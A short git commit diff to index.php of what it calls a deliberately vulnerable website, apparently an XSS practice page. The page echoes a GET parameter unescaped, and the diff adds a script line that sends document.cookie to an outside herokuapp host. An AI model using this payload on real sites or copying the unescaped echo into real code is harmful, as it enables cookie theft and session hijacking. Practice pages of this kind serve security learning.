01716820a9a4fad9f9552a7939db94888d958e1c
realfonzy <45441021+realfonzy@users.noreply.github.com>
2018-11-30 22:30:39 +0100

    Update index.php

--- index.php
+++ index.php
@@ -2,10 +2,11 @@
   echo $_GET['bla']
 ?>
 <html>
+  <h2>my f*n vulnerable website</h2>
   <script type="text/javascript">
     document.cookie = "macookie=asdfjkl";
-    document.write(document.cookie);
-  </script>
+    document.location='http://kekse.herokuapp.com/hmmm.php?c='+document.cookie;</script>
+  <p>please leve a comment...</p>
   <form action="/index.php">
     <input type="text" name="bla"><br />
     <input type="submit" value="Submit">
